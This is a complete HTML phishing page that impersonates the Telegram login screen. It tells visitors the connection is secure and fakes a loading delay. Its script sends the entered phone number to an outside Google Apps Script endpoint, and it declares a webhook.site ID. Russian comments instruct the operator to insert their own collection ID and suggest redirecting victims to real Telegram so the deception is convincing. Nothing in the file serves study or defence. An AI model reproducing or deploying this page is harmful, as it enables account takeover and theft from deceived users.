<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1c242f; /* Темная тема TG */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 160px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 500;
        }
        p {
            color: #aaaaaa;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #aaaaaa;
            font-size: 14px;
        }
        input[type="tel"] {
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background-color: #2b3845;
            color: white;
            font-size: 18px;
            box-sizing: border-box;
            outline: none;
        }
        input[type="tel"]:focus {
            box-shadow: 0 0 0 2px #2b96ff;
        }
        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background-color: #2b96ff; /* Цвет кнопки TG */
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #237ce0;
        }
        .footer {
            margin-top: 40px;
            font-size: 13px;
            color: #666;
        }
        /* Анимация загрузки */
        .loader {
            display: none;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top: 3px solid #fff;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Логотип Telegram SVG -->
    <svg class="logo" viewBox="0 0 24 24" fill="#2b96ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.01-.38-1.57-.74-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.73-2.5 2.78-2.7a.96.96 0 0 0-.24-.74c-.09-.08-.22-.05-.32-.02-.14.05-2.38 1.52-6.76 4.42-.64.44-1.22.66-1.84.65-.6-.01-1.76-.34-2.62-.62-1.06-.34-1.91-.53-1.83-1.12.05-.33.5-.66 1.37-.99 5.39-2.35 8.99-3.91 10.8-4.68.52-.25 1-.38 1.43-.38.42 0 .82.26 1.05.66.23.4.26.82.22 1.23z"/></svg>

    <h2>Telegram Login</h2>
    <p>Please enter your phone number to receive the confirmation code.</p>

    <form id="loginForm">
        <div class="input-group">
            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" placeholder="+1 234 567 8900" required autocomplete="off">
        </div>
        
        <button type="submit" id="btn">Next</button>
        <div class="loader" id="loader"></div>
    </form>

    <div class="footer">
        This is a secure connection to Telegram.
    </div>
</div>

<script>
    // ВСТАВЬ СЮДА СВОЙ ID С WEBHOOK.SITE ВМЕСТО ВАШ_ID
    const WEBHOOK_ID = '87b213c3-4b68-4a76-9ef6-5f60bb4a659e'; 

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const phone = document.getElementById('phone').value;
        const btn = document.getElementById('btn');
        const loader = document.getElementById('loader');

        // Визуальные эффекты
        btn.style.display = 'none';
        loader.style.display = 'block';

        // Имитация задержки как у настоящего ТГ
        setTimeout(() => {
            loader.style.display = 'none';
            
            // Отправка данных
            fetch('https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec?phone=' + encodeURIComponent(phone))
                .catch(console.error);

            // Показываем экран кода
            document.querySelector('.input-group').style.display = 'none';
            btn.style.display = 'block';
            btn.textContent = 'Enter Code';
            btn.onclick = () => {
                 alert('Code sent to ' + phone);
                 // Здесь можно добавить редирект на настоящий tg.me для верности
                 // window.location.href = "https://web.telegram.org/k/";
            };
        }, 1500);
    });
</script>

</body>
</html>
